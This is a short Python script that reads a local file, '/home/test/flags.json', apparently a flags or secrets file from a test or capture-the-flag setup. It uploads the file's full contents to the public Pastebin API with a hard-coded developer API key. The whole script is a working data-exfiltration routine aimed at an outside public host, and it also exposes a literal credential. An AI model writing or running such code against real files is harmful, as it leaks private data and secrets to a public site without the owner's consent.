import requests

# Replace with your developer API key
api_key = 'LQR2wg5QWv4ZTI7_smidulNQCB-2MvAf'

# Specify the file path
file_path = '/home/test/flags.json'

# Read the content of the file
with open(file_path, 'r') as f:
    file_content = f.read()

# Set the parameters for the Pastebin API request
api_url = 'https://pastebin.com/api/api_post.php'
data = {
    'api_dev_key': api_key,
    'api_option': 'paste',
    'api_paste_code': file_content
}

# Make the API request
response = requests.post(api_url, data=data)

# Print the Pastebin URL if successful
if response.ok:
    print('File uploaded to Pastebin:')
    print(response.text)
else:
    print('Error uploading file to Pastebin')

